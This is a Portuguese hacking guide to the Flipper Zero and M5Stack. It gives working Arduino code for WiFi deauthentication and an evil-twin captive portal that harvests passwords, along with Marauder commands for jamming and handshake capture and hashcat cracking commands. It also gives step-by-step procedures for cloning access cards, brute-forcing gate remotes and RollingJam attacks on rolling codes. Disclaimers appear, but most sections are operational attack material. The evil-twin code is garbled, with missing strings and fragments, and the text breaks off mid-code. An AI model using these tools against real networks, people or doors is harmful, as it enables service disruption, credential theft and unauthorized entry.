Introdução aos Dispositivos

O Flipper Zero e o M5Stack se tornaram ferramentas essenciais para profissionais de segurança, pentesters e entusiastas de hardware hacking. Ambos os dispositivos oferecem capacidades poderosas em um formato portátil e acessível, permitindo testar e analisar diversos sistemas de segurança eletrônica.

Flipper Zero

O Flipper Zero é um "multi-ferramenta" portátil para pentest de hardware e sistemas de segurança sem fio. Pode interagir com sistemas RFID, NFC, infravermelhos, sub-GHz, Bluetooth e funciona como ponte para outros dispositivos como ESP32 para ataques Wi-Fi.

  • Leitura e emulação de cartões RFID (125kHz) e NFC (13.56MHz)
  • Captura e reprodução de sinais sub-GHz (controles remotos, portões)
  • Funcionalidade de BadUSB para ataques de dispositivos HID
  • Receptor e transmissor IR para controlar TVs e outros aparelhos
  • GPIO para conexão com outros dispositivos (ESP32, Raspberry Pi)

M5Stack

O M5Stack é uma série de dispositivos modulares baseados em ESP32, com tela, botões e interfaces expansíveis. Sua arquitetura modular permite criar rapidamente ferramentas para diversos cenários de segurança e pentesting.

  • Processador ESP32 dual-core com WiFi e Bluetooth integrados
  • Tela colorida para interface gráfica de aplicações
  • Sistema modular com diversos add-ons (GPS, LoRa, GSM, etc.)
  • Capacidades de WiFi deauth, scanning e packet sniffing
  • Programável via Arduino IDE, UIFlow (Blockly) ou MicroPython

Aviso Legal

As técnicas e ferramentas descritas neste guia são para fins educacionais e testes autorizados. O uso indevido destas técnicas para invadir redes ou dispositivos sem autorização é ilegal e pode resultar em sérias consequências legais. Sempre obtenha permissão explícita antes de realizar qualquer teste de segurança.

Flipper Zero

O Flipper Zero tornou-se rapidamente um dos dispositivos mais populares para testes de segurança física e sem fio. Seu design amigável com uma interface inspirada em Tamagotchi esconde um conjunto poderoso de ferramentas para interação com diversos sistemas.

Interface e Navegação

A interface do Flipper Zero é organizada em um menu principal com diferentes aplicativos para cada funcionalidade:

Sub-GHz

Recebe e transmite sinais de rádio em 433/315MHz, usado para controles remotos, portões automáticos, e outros dispositivos sem fio.

RFID

Lê, emula e escreve tags RFID de 125kHz (EM4100, HID ProxCard, Indala).

NFC

Trabalha com tecnologias de 13.56MHz, incluindo MIFARE Classic, MIFARE Ultralight, EMV, e outros padrões NFC.

Infrared

Captura, armazena e reproduz sinais infravermelhos para controlar TVs, ar-condicionados e outros aparelhos.

BadUSB

Funciona como um teclado USB malicioso, executando scripts para automatizar comandos.

iButton

Lê e emula chaves Dallas e Cyfral, comumente usadas em sistemas de controle de acesso.

GPIO

Permite controlar os pinos GPIO para comunicação com outros dispositivos e sensores.

Utilities

Inclui ferramentas como osciloscópio, analisador de protocolo, gravador de áudio e outros utilitários.

Navegação básica no Flipper Zero:

  • Botão central (OK): Seleciona opções ou confirma ações
  • D-pad: Navegação nos menus (cima, baixo, esquerda, direita)
  • Botão traseiro: Volta ao menu anterior ou cancela operações
  • Pressionar botão traseiro + direito simultaneamente: Captura de tela
  • Pressionar botão traseiro por 3 segundos: Desliga o dispositivo

Programação com UIFlow

UIFlow é uma plataforma de programação baseada em blocos (semelhante ao Scratch) que facilita a criação de aplicações para M5Stack sem necessidade de conhecimento avançado em programação.

# Exemplo de código Python gerado pelo UIFlow para um scanner WiFi básico
from m5stack import *
from m5ui import *
from uiflow import *
import wifiCfg
import time

lcd.clear()
lcd.font(lcd.FONT_DejaVu24)
lcd.print("WiFi Scanner", 85, 10, 0xffffff)

def scan_networks():
    lcd.font(lcd.FONT_DejaVu18)
    lcd.print("Escaneando...", 100, 100, 0xffffff)
    networks = wifiCfg.scan()
    lcd.clear()
    lcd.font(lcd.FONT_DejaVu24)
    lcd.print("Redes WiFi: " + str(len(networks)), 50, 10, 0xffffff)
    
    y_pos = 50
    for net in networks[:8]:  # Mostra até 8 redes
        ssid = net[0].decode()
        strength = net[3]
        security = "🔒" if net[4] else "🔓"
        lcd.font(lcd.FONT_DejaVu18)
        lcd.print(security + " " + ssid + " (" + str(strength) + "dBm)", 10, y_pos, 0xffffff)
        y_pos += 25

btnA.wasPressed(scan_networks)
scan_networks()  # Executa o scan inicial

Passos para usar o UIFlow:

  1. Acesse flow.m5stack.com
  2. Coloque seu M5Stack em modo de programação: pressione e segure o botão lateral por 2 segundos
  3. Conecte seu M5Stack à rede WiFi para programação sem fio ou via USB
  4. Crie seu programa arrastando e soltando blocos ou escrevendo código Python
  5. Clique em "Run" para executar o programa ou "Upload" para salvá-lo no dispositivo

Programação com Arduino IDE

Para aplicações mais avançadas de pentesting, a programação via Arduino IDE oferece maior controle e acesso a bibliotecas especializadas:

// Exemplo de código para deauth attack usando M5Stack
#include 
#include "WiFi.h"
#include "esp_wifi.h"

// Estrutura para criar pacotes de deauth
typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t dest_addr[6];
  uint8_t source_addr[6];
  uint8_t bssid[6];
  uint8_t sequence[2];
  uint8_t reason[2];
} __attribute__((packed)) deauth_frame;

uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t targetMac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Endereço MAC do alvo

deauth_frame deauthPacket;

void setup() {
  M5.begin();
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Deauth Attack Tool");
  
  // Configuração do WiFi em modo monitor
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  
  // Preparar pacote de deauth
  deauthPacket.frame_ctrl[0] = 0xC0;
  deauthPacket.frame_ctrl[1] = 0x00;
  deauthPacket.duration[0] = 0x00;
  deauthPacket.duration[1] = 0x00;
  
  // Copiar endereços MAC
  memcpy(deauthPacket.dest_addr, broadcastMac, 6);
  memcpy(deauthPacket.source_addr, targetMac, 6);
  memcpy(deauthPacket.bssid, targetMac, 6);
  
  deauthPacket.sequence[0] = 0x00;
  deauthPacket.sequence[1] = 0x00;
  deauthPacket.reason[0] = 0x01; // Razão 1: "Unspecified"
  deauthPacket.reason[1] = 0x00;
  
  M5.Lcd.println("Setup concluido");
  M5.Lcd.println("Botao A: Iniciar ataque");
  M5.Lcd.println("Botao B: Parar ataque");
}

bool attacking = false;
unsigned long lastPacketTime = 0;

void loop() {
  M5.update();
  
  if (M5.BtnA.wasPressed()) {
    attacking = true;
    M5.Lcd.fillRect(0, 150, 320, 30, BLACK);
    M5.Lcd.setCursor(0, 150);
    M5.Lcd.println("Ataque iniciado...");
  }
  
  if (M5.BtnB.wasPressed()) {
    attacking = false;
    M5.Lcd.fillRect(0, 150, 320, 30, BLACK);
    M5.Lcd.setCursor(0, 150);
    M5.Lcd.println("Ataque parado");
  }
  
  if (attacking && millis() - lastPacketTime > 100) { // Enviar 10 pacotes por segundo
    // Enviar pacote de deauth
    esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false);
    lastPacketTime = millis();
    
    static int count = 0;
    count++;
    M5.Lcd.fillRect(0, 180, 320, 30, BLACK);
    M5.Lcd.setCursor(0, 180);
    M5.Lcd.printf("Pacotes enviados: %d", count);
  }
}

Hacking WiFi

O Flipper Zero não possui capacidade WiFi nativa, mas pode ser expandido com módulos externos. Já o M5Stack tem WiFi integrado, tornando-o ideal para testes de segurança sem fio.

ESP32 Marauder no Flipper Zero

O ESP32 Marauder é um firmware para ESP32 que, quando conectado ao Flipper Zero, transforma-o em uma poderosa ferramenta de pentesting WiFi.

# Instalação do ESP32 Marauder com Flipper Zero

1. Obtenha um módulo ESP32 compatível (ESP32-S2, ESP32 WROOM, etc.)
2. Conecte o ESP32 ao Flipper Zero usando o cabo adaptador:
   - 3.3V do Flipper -> 3.3V do ESP32
   - GND do Flipper -> GND do ESP32
   - TX do Flipper -> RX do ESP32
   - RX do Flipper -> TX do ESP32

3. Instale o firmware Marauder no ESP32:
   a. Baixe o firmware em https://github.com/justcallmekoko/ESP32Marauder/releases
   b. Use a ferramenta web flasher em https://marauder.xyz/wifi ou esptool.py
   c. Para esptool.py, use o comando:
      esptool.py --port [PORTA] --baud 115200 write_flash 0x10000 [ARQUIVO_FIRMWARE]

4. Instale o aplicativo "WiFi Marauder" no Flipper Zero:
   a. Baixe o arquivo .fap em https://github.com/0xchocolate/flipperzero-firmware-with-wifi-marauder-companion
   b. Copie para o cartão SD do Flipper no diretório /apps/GPIO/
   c. Ou instale via qFlipper ou Flipper Mobile App

5. Conecte o ESP32 e inicie o aplicativo no Flipper Zero:
   Navegue para: GPIO -> WiFi Marauder

Comandos básicos do Marauder no Flipper Zero:

  • scan ap: Escaneia redes WiFi nas proximidades
  • select ap [número]: Seleciona uma rede para alvo
  • attack deauth: Inicia um ataque de desautenticação na rede selecionada
  • attack deauth -s: Para o ataque de desautenticação
  • sniff pmkid: Captura handshakes PMKID
  • sniff pmkid -s: Para a captura de PMKID
  • sniff beacon: Captura beacon frames
  • sniff beacon -s: Para a captura de beacons
  • list ap: Lista as redes encontradas
  • list station: Lista os dispositivos conectados às redes
  • clearlist ap: Limpa a lista de APs
  • setting defaultwifichannel [canal]: Define o canal WiFi padrão
  • setting scantime [tempo em ms]: Define o tempo de escaneamento

Ataques de Deauth

O ataque de desautenticação força dispositivos a se desconectarem de uma rede WiFi, permitindo capturar handshakes ou testar a segurança.

# No ESP32 Marauder com Flipper Zero:
scan ap                 # Escaneia redes WiFi
select ap 2             # Seleciona a rede #2 da lista
attack deauth           # Inicia o ataque de desautenticação
attack deauth -s        # Para o ataque

# Com M5Stack (código Arduino):
// Configuração no setup()
esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

// Na função de ataque
void sendDeauth(uint8_t* targetMAC, uint8_t* gatewayMAC) {
  uint8_t packet[26] = {
    0xC0, 0x00,                   // Tipo e subtipo (deauth)
    0x00, 0x00,                   // Duração
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Endereço de destino (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Endereço de origem (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID
    0x00, 0x00,                   // Número de sequência
    0x01, 0x00                    // Razão (1 = não especificada)
  };
  
  // Preencher endereços MAC
  memcpy(&packet[10], gatewayMAC, 6);
  memcpy(&packet[16], gatewayMAC, 6);
  
  // Enviar pacote
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

Jamming de 2.4GHz e 5GHz

O jamming de sinais WiFi pode ser realizado para testes de resiliência de sistemas ou como parte de avaliações de segurança.

Aviso Legal

O jamming de sinais WiFi é ilegal na maioria dos países e pode interferir com serviços críticos. Estas técnicas só devem ser usadas em ambientes controlados e isolados com autorização explícita.

# Jamming no ESP32 Marauder (Flipper Zero):
setting beaconinterval 10      # Define intervalo curto para beacons
attack beacon spam -c          # Inicia spam de beacons (ocupando o espectro)
attack beacon spam -s          # Para o ataque

# Jamming seletivo em canais específicos:
setting defaultwifichannel 6   # Escolhe o canal 6
attack deauth                  # Inicia deauth nesse canal
# Repita para diferentes canais ou use:
attack deauth -c               # Ataque em todos os canais

# Jamming 5GHz (requer hardware compatível):
setting support5ghz true       # Habilita suporte a 5GHz
setting defaultwifichannel 36  # Escolhe o canal 36 (5GHz)
attack deauth                  # Inicia deauth no canal 5GHz

Redes Evil Twin

As redes Evil Twin são redes falsas que imitam redes legítimas para capturar credenciais ou dados. Esta técnica é usada em testes de conscientização sobre segurança.

# Evil Twin com ESP32 Marauder (Flipper Zero):
scan ap                      # Escaneia redes WiFi
select ap 2                  # Seleciona a rede a ser clonada
attack beacon -c             # Inicia clone de beacons da rede
setting ssid "NomeDeRedeAlvo"  # Define SSID manualmente
setting channel 6            # Define canal da rede falsa
attack ap                    # Cria ponto de acesso falso

# Configurando captive portal:
attack captiveportal -c      # Inicia captive portal para capturar credenciais
attack captiveportal -s      # Para o captive portal
update portal index.html     # Atualiza a página do portal

# Verificando credenciais capturadas:
list credentials             # Mostra credenciais capturadas

void startAttack() {
  WiFi.mode(WIFI_AP);

  WiFi.softAP(targetSSID);

";

    content += "

  });
  
  webServer.on("/login", HTTP_POST, []() {
    String username = webServer.arg("username");
    String password = webServer.arg("password");
    
    // Salva as credenciais
    credentialsLog += "Usuario: " + username + " | Senha: " + password + "\n";

Conectando...
";
    content += "

void stopAttack() {
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  attackRunning = false;
  
  M5.Lcd.fillRect(0, 150, 320, 90, BLACK);
  M5.Lcd.setCursor(0, 150);
  M5.Lcd.println("Ataque interrompido");

void showCredentials() {
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.println("Credenciais capturadas:");
  M5.Lcd.println();
  
  if (credentialsLog == "") {
    M5.Lcd.println("Nenhuma credencial capturada");
  } else {
    M5.Lcd.setTextSize(1);
    M5.Lcd.println(credentialsLog);
    M5.Lcd.setTextSize(2);
  }
  
  M5.Lcd.println("\nC: Voltar ao menu");
}

void loop() {
  M5.update();
  
  if (M5.BtnA.wasPressed()) {
    startAttack();
  }
  
  if (M5.BtnB.wasPressed()) {
    stopAttack();
  }
  
  if (M5.BtnC.wasPressed()) {
    if (attackRunning) {
      showCredentials();
      while (!M5.BtnC.wasPressed()) {
        M5.update();
        delay(10);
      }
      
      // Restaura a tela principal
      M5.Lcd.fillScreen(BLACK);
      M5.Lcd.setCursor(0, 0);
      M5.Lcd.println("Evil Twin Attack Tool");
      M5.Lcd.println("A: Iniciar ataque");
      M5.Lcd.println("B: Parar ataque");
      M5.Lcd.println("C: Ver credenciais");
      
      if (attackRunning) {
        M5.Lcd.setCursor(0, 150);
        M5.Lcd.println("Ataque em andamento!");
        M5.Lcd.println("AP: " + targetSSID);
        M5.Lcd.println("IP: 192.168.4.1");
      }
    }
  }
  
  if (attackRunning) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
}

Captura de Handshakes

A captura de handshakes WPA/WPA2 é uma etapa crucial para testes de segurança de senha em redes WiFi.

# Captura de handshakes com ESP32 Marauder (Flipper Zero):
scan ap                      # Escaneia redes WiFi
select ap 2                  # Seleciona a rede alvo
attack deauth                # Inicia ataque de desautenticação para forçar reconexões
sniff pmkid                  # Inicia captura de handshakes PMKID
# ou
sniff raw                    # Captura de pacotes brutos para análise posterior

# Após alguns segundos:
attack deauth -s             # Para o ataque de desautenticação
sniff pmkid -s               # Para a captura

# Salvando os dados capturados:
save pmkid handshake.pcap    # Salva no formato pcap
save pmkid handshake.hccapx  # Salva no formato hccapx (para Hashcat)

# Verificando handshakes capturados:
list handshakes              # Lista os handshakes obtidos

Ataques de Força Bruta

Após capturar handshakes, é possível realizar ataques de força bruta para testar a segurança das senhas. O Flipper Zero e M5Stack não são potentes o suficiente para quebrar senhas complexas diretamente, mas podem ser usados para capturar os dados necessários.

# Transferindo capturas para computador para uso com ferramentas de quebra:

# No Flipper Zero:
1. Conecte o Flipper Zero ao computador via USB
2. Acesse o armazenamento e copie os arquivos .pcap ou .hccapx

# Usando Hashcat para quebrar senhas (no computador):
hashcat -m 16800 handshake.hccapx wordlist.txt         # Para PMKID
hashcat -m 2500 handshake.hccapx wordlist.txt          # Para WPA/WPA2
hashcat -m 2500 handshake.hccapx -a 3 ?d?d?d?d?d?d?d?d # Força bruta com dígitos

# Comando para usar regras de transformação:
hashcat -m 2500 handshake.hccapx wordlist.txt -r rules/best64.rule

Dica Profissional

Para maior eficiência, use o Flipper Zero com ESP32 Marauder para capturar handshakes em campo, e depois transfira os arquivos para um computador com GPU potente para realizar os ataques de força bruta com Hashcat.

RFID e NFC

O Flipper Zero suporta leitura, emulação e clonagem de diversos cartões RFID (125kHz) e NFC (13.56MHz), tornando-o uma ferramenta poderosa para testes de segurança de controle de acesso físico.

Leitura de Cartões

O primeiro passo para trabalhar com RFID/NFC é a leitura e identificação dos cartões.

# Leitura de cartões RFID no Flipper Zero

## RFID 125kHz (EM4100, HID, Indala):
1. Navegue para: RFID -> Read
2. Aproxime o cartão da parte superior do Flipper Zero
3. Aguarde o sinal sonoro e a vibração indicando a leitura bem-sucedida
4. O Flipper exibirá o tipo de cartão e seu ID único
5. Pressione o botão direito para ver mais detalhes
6. Salve o cartão pressionando o botão central (OK) e dando um nome

## NFC 13.56MHz (MIFARE Classic, Ultralight, etc.):
1. Navegue para: NFC -> Read
2. Aproxime o cartão da parte superior do Flipper Zero
3. O Flipper tentará identificar o tipo de cartão
4. Se for compatível, exibirá informações como UID, ATQA, SAK
5. Para MIFARE Classic, tentará ler os setores usando chaves conhecidas
6. Salve o cartão pressionando o botão central (OK) e dando um nome

Tipos de cartões suportados pelo Flipper Zero:

  • RFID 125kHz: EM4100, EM4102, HID ProxCard, Indala
  • NFC 13.56MHz: MIFARE Classic, MIFARE Ultralight, NTAG, algumas tags EMV, alguns cartões de transporte

Emulação de Cartões

Uma vez que o cartão foi lido e salvo, o Flipper Zero pode emular seu funcionamento.

# Emulação de cartões no Flipper Zero

## Emulação RFID 125kHz:
1. Navegue para: RFID -> Saved
2. Selecione o cartão que deseja emular
3. Escolha "Emulate" no menu
4. Aproxime o Flipper Zero do leitor de cartões
5. O cartão será emulado até que você pressione o botão traseiro

## Emulação NFC 13.56MHz (limitado):
1. Navegue para: NFC -> Saved
2. Selecione o cartão que deseja emular
3. Escolha "Emulate" no menu
4. Aproxime o Flipper Zero do leitor
5. Alguns cartões NFC não podem ser completamente emulados devido a limitações de hardware 
   ou proteções de segurança

Limitações importantes de emulação:

  • Cartões MIFARE Classic protegidos com autenticação não podem ser completamente emulados sem as chaves
  • Cartões com criptografia avançada como DESFire, HID iClass, ou cartões bancários não podem ser emulados
  • A emulação funciona melhor com cartões simples como EM4100 ou MIFARE Ultralight

Clonagem de Cartões

Para cartões compatíveis, o Flipper Zero pode gravar os dados lidos em cartões graváveis em branco.

# Clonagem de cartões no Flipper Zero

## Clonagem RFID 125kHz:
1. Primeiro, leia o cartão original como descrito anteriormente
2. Navegue para: RFID -> Saved
3. Selecione o cartão que deseja clonar
4. Escolha "Write" no menu
5. Aproxime um cartão T5577/T5557 gravável do Flipper Zero
6. Aguarde a conclusão da gravação
7. Teste o cartão clonado no leitor original

## Clonagem NFC 13.56MHz:
1. Primeiro, leia o cartão original e salve-o
2. Navegue para: NFC -> Saved
3. Selecione o cartão que deseja clonar
4. Escolha "Write" no menu
5. Aproxime um cartão compatível em branco (MIFARE Classic/Ultralight gravável)
6. Alguns cartões têm proteções que impedem a clonagem completa

Cartões graváveis compatíveis:

  • RFID 125kHz: T5577, T5557, EM4305
  • NFC 13.56MHz: MIFARE Classic "Magic Cards", MIFARE Ultralight em branco, NTAG21x em branco

Dica Profissional

As "Magic Cards" são cartões MIFARE Classic especiais que podem ser gravados com qualquer UID, contornando a proteção que impede a alteração do UID em cartões normais. São excelentes para testes de segurança.

Brute Force de Chaves

Para cartões MIFARE Classic protegidos, o Flipper Zero pode tentar quebrar as chaves de acesso.

# Brute Force de chaves MIFARE Classic no Flipper Zero

1. Navegue para: NFC -> Mf Classic Tool
2. Escolha "Read with Key Dictionary"
3. Aproxime o cartão MIFARE Classic
4. O Flipper tentará todas as chaves em seu dicionário para acessar os setores protegidos
5. O processo pode levar vários minutos dependendo do tamanho do dicionário

# Adicionando chaves personalizadas:
1. Conecte o Flipper Zero ao computador
2. Acesse a pasta /nfc/assets/mf_classic_dict.nfc
3. Adicione suas chaves ao arquivo no formato hex de 6 bytes (12 caracteres)
4. Cada chave deve estar em uma linha separada
5. Desconecte e use o novo dicionário para tentativas de ataque

Dicionários de chaves populares:

  • Dicionário padrão do Flipper (inclui chaves comuns)
  • Extended dictionary (disponível em Repositório UberGuidoZ)
  • Dicionário específico para cartões de transporte (disponível em fóruns de segurança)

Sub-GHz (433/315MHz)

O módulo Sub-GHz do Flipper Zero permite interagir com diversos dispositivos que operam nas frequências de 433MHz ou 315MHz, como controles remotos, portões de garagem, e sistemas de alarme.

Captura de Sinais

A captura de sinais é o primeiro passo para analisar dispositivos Sub-GHz.

# Captura de sinais Sub-GHz no Flipper Zero

1. Navegue para: Sub-GHz -> Read
2. Escolha a frequência adequada (433.92MHz é a mais comum)
3. Pressione o botão central para iniciar a captura
4. Acione o controle remoto que deseja capturar
5. O Flipper Zero exibirá informações sobre o sinal detectado
6. Pressione o botão central novamente para salvar o sinal
7. Dê um nome ao arquivo e confirme

# Tipos de modulação que o Flipper pode capturar:
- AM (Amplitude Modulation)
- FM (Frequency Modulation)
- Diversos protocolos como:
  - Princeton
  - CAME
  - Nice FLO
  - Keeloq
  - Star Line
  - Linear/Chamberlain
  - e muitos outros

Dica Profissional

Se estiver capturando um sinal não identificado pelo Flipper, use a opção "RAW" para capturar o sinal bruto. Isto permitirá reproduzir o sinal mesmo sem decodificar seu protocolo.

Replay de Sinais

Após capturar, o Flipper Zero pode reproduzir os sinais para testar a segurança do dispositivo.

# Replay de sinais Sub-GHz no Flipper Zero

1. Navegue para: Sub-GHz -> Saved
2. Selecione o sinal que deseja reproduzir
3. Escolha "Send" no menu
4. O Flipper Zero transmitirá o sinal capturado
5. Observe se o dispositivo original responde ao sinal

# Para sinais com código fixo:
- O replay funcionará diretamente na maioria dos casos

# Para sinais com rolling code (código variável):
- O replay simples pode não funcionar devido à proteção anti-replay
- Neste caso, técnicas como RollingJam podem ser necessárias

Brute Force de Códigos

Para sistemas simples com código fixo, o Flipper Zero pode tentar várias combinações para encontrar o código correto.

# Brute Force de códigos Sub-GHz no Flipper Zero

1. Navegue para: Sub-GHz -> Tools -> Bruteforce
2. Selecione o protocolo a ser atacado:
   - Princeton
   - CAME
   - Chamberlain
   - Linear
   - Nice FLO
   - Firefly
3. Defina o número de bits do código (geralmente 12 ou 24)
4. Escolha a frequência (normalmente 433.92MHz ou 315MHz)
5. Inicie o ataque e o Flipper tentará várias combinações
6. Quando o dispositivo responder, você pode salvar o código encontrado

# Exemplo para portão Chamberlain:
1. Selecione "Chamberlain" como protocolo
2. Use 8 bits para códigos antigos, 12 bits para modelos mais recentes
3. Frequência 390MHz (EUA) ou 433MHz (Europa)
4. Inicie o ataque e observe o portão

Aviso de Tempo

Ataques de força bruta podem levar muito tempo, especialmente para sistemas com códigos longos. Para um sistema de 12 bits, existem 4.096 combinações possíveis. Para otimizar, tente determinar primeiro o número de bits e protocolo corretos.

Ataques de Rolling Jam

Para sistemas com código variável (rolling code), o ataque de replay simples não funciona. O método RollingJam pode ser usado para interceptar e armazenar sinais válidos não utilizados.

# Ataque RollingJam com Flipper Zero

## Princípio do ataque:
1. Capture e bloqueie o sinal original enviado pelo controle remoto
2. Armazene este sinal (que ainda não foi recebido pelo receptor)
3. Posteriormente, reproduza o sinal armazenado para acionar o dispositivo

## No Flipper Zero (requer firmware personalizado):
1. Navegue para: Sub-GHz -> Tools -> RollingJam
2. Defina a frequência (433.92MHz comum para Europa, 315MHz para EUA)
3. Escolha um nome para o arquivo de captura
4. Inicie o modo de captura com o botão central
5. Quando o controle remoto for acionado:
   - O Flipper captura o sinal
   - Transmite um sinal de interferência para bloquear a recepção
   - Armazena o código original para uso posterior
6. Repita o processo para capturar múltiplos códigos
7. Reproduza os códigos capturados quando necessário

## Limitações:
- Nem todos os firmwares do Flipper incluem esta funcionalidade
- A eficácia varia de acordo com o sistema alvo
- Alguns sistemas modernos têm proteções adicionais contra este tipo de ataque

Configuração Avançada

Para melhorar a eficácia do RollingJam, você pode usar uma antena externa conectada ao GPIO do Flipper Zero. Existem antenas de 433MHz ajustáveis que melhoram significativamente o alcance e a capacidade de bloquear sinais.

BadUSB

O recurso BadUSB transforma o Flipper Zero em um dispositivo USB HID (Human Interface Device) que pode emular um teclado e executar comandos predefinidos em computadores conectados.

Scripts de Payload

Os scripts BadUSB (também conhecidos como payloads Ducky) permitem automatizar sequências de teclas para realizar diversas ações.

# Criando e usando scripts BadUSB no Flipper Zero

1. Crie um arquivo com extensão .txt no diretório /badusb/ do cartão SD
2. Edite o arquivo usando a sintaxe Ducky Script
3. No Flipper Zero, navegue para: BadUSB -> seu_arquivo.txt
4. Conecte o Flipper a uma porta USB de um computador
5. Pressione o botão central para executar o script

# Exemplo de script para Windows (abre o Prompt de Comando e obtém informações IP):
REM Abre o prompt de comando
DELAY 500
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
REM Executa comando ipconfig
STRING ipconfig /all
ENTER
DELAY 3000
REM Salva resultado em um arquivo
STRING ipconfig /all > %TEMP%\ip_info.txt
ENTER
DELAY 500
REM Abre o arquivo
STRING notepad %TEMP%\ip_info.txt
ENTER

# Comandos básicos do Ducky Script:
REM [comentário]             - Comentário (não executado)
DELAY [milissegundos]        - Espera pelo tempo especificado
STRING [texto]               - Digita o texto especificado
ENTER                        - Pressiona a tecla Enter
GUI [tecla]                  - Pressiona tecla Windows + [tecla]
ALT [tecla]                  - Pressiona Alt + [tecla]
CTRL [tecla]                 - Pressiona Ctrl + [tecla]
SHIFT [tecla]                - Pressiona Shift + [tecla]

Aviso Importante

A funcionalidade BadUSB deve ser usada apenas em sistemas nos quais você tem permissão explícita para testar. O uso não autorizado para obter acesso ou exfiltrar dados é ilegal e antiético.

Ataques de Exfiltração

Scripts mais avançados podem ser usados para demonstrar vulnerabilidades em sistemas não protegidos contra ataques BadUSB.

  • Utilizar bloqueadores USB (dispositivos que permitem apenas conexões de armazenamento, bloqueando HID)
  • Implementar políticas de controle de dispositivos no sistema operacional
  • Manter sistemas atualizados com patches de segurança
  • Usar autenticação de múltiplos fatores para acesso a sistemas críticos
  • Educar usuários sobre os riscos de conectar dispositivos USB desconhecidos

Projetos Avançados

Combinando o Flipper Zero, M5Stack e outros dispositivos, é possível criar projetos avançados para testes de segurança mais complexos.

Wardriving Automatizado

Wardriving é a prática de mapear redes WiFi em uma área geográfica. Combinando GPS com capacidades de escaneamento WiFi, é possível criar uma solução completa.

# Projeto de Wardriving com M5Stack e módulo GPS

#include 
#include "WiFi.h"
#include 
#include 

TinyGPSPlus gps;
HardwareSerial GPSSerial(2);  // Use UART2 para M5Stack
File logFile;

void setup() {
  M5.begin();
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Wardriving Tool");
  
  // Inicializar GPS (conectado à porta UART2)
  GPSSerial.begin(9600, SERIAL_8N1, 16, 17);  // RX, TX para Core
  
  // Inicializar cartão SD
  if (!SD.begin()) {
    M5.Lcd.println("Falha ao iniciar SD Card");
    while (1);
  }
  
  // Criar arquivo de log
  String filename = "/wardriving_" + String(millis()) + ".csv";
  logFile = SD.open(filename, FILE_WRITE);
  if (logFile) {
    logFile.println("MAC,SSID,RSSI,Channel,Encryption,Latitude,Longitude,Accuracy,Date,Time");
    logFile.flush();
  }
  
  // Configurar WiFi para escaneamento
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  M5.Lcd.println("Sistema pronto");
  M5.Lcd.println("A: Iniciar scan");
  M5.Lcd.println("B: Parar scan");
  M5.Lcd.println("C: Status");
}

bool scanning = false;
int networksFound = 0;
unsigned long lastScanTime = 0;
double currentLat = 0, currentLng = 0;
int satellitesConnected = 0;

void loop() {
  M5.update();
  
  // Ler dados do GPS
  while (GPSSerial.available() > 0) {
    gps.encode(GPSSerial.read());
  }
  
  if (gps.location.isUpdated()) {
    currentLat = gps.location.lat();
    currentLng = gps.location.lng();
    satellitesConnected = gps.satellites.value();
  }
  
  if (M5.BtnA.wasPressed()) {
    scanning = true;
    M5.Lcd.fillRect(0, 150, 320, 90, BLACK);
    M5.Lcd.setCursor(0, 150);
    M5.Lcd.println("Escaneamento iniciado");
  }
  
  if (M5.BtnB.wasPressed()) {
    scanning = false;
    M5.Lcd.fillRect(0, 150, 320, 90, BLACK);
    M5.Lcd.setCursor(0, 150);
    M5.Lcd.println("Escaneamento parado");
    if (logFile) {
      logFile.flush();
    }
  }
  
  if (M5.BtnC.wasPressed()) {
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("Status do Sistema");
    M5.Lcd.printf("Redes encontradas: %d\n", networksFound);
    M5.Lcd.printf("GPS: %.6f, %.6f\n", currentLat, currentLng);
    M5.Lcd.printf("Satélites: %d\n", satellitesConnected);
    M5.Lcd.printf("Scanning: %s\n", scanning ? "Sim" : "Não");
    delay(3000);
    
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("Wardriving Tool");
    M5.Lcd.println("A: Iniciar scan");
    M5.Lcd.println("B: Parar scan");
    M5.Lcd.println("C: Status");
    
    if (scanning) {
      M5.Lcd.setCursor(0, 150);
      M5.Lcd.println("Escaneamento em andamento");
    }
  }
  
  // Realizar escaneamento a cada 30 segundos
  if (scanning && (millis() - lastScanTime > 30000)) {
    M5.Lcd.fillRect(0, 180, 320, 60, BLACK);
    M5.Lcd.setCursor(0, 180);
    M5.Lcd.println("Escaneando redes...");
    
    int numNetworks = WiFi.scanNetworks();
    
    if (numNetworks == 0) {
      M5.Lcd.println("Nenhuma rede encontrada");
    } else {
      networksFound += numNetworks;
      M5.Lcd.printf("Encontradas %d redes\n", numNetworks);
      
      // Salvar informações no arquivo CSV
      if (logFile) {
        for (int i = 0; i < numNetworks; i++) {
          String encryptionType;
          switch(WiFi.encryptionType(i)) {
            case WIFI_AUTH_OPEN: encryptionType = "Open"; break;
            case WIFI_AUTH_WEP: encryptionType = "WEP"; break;
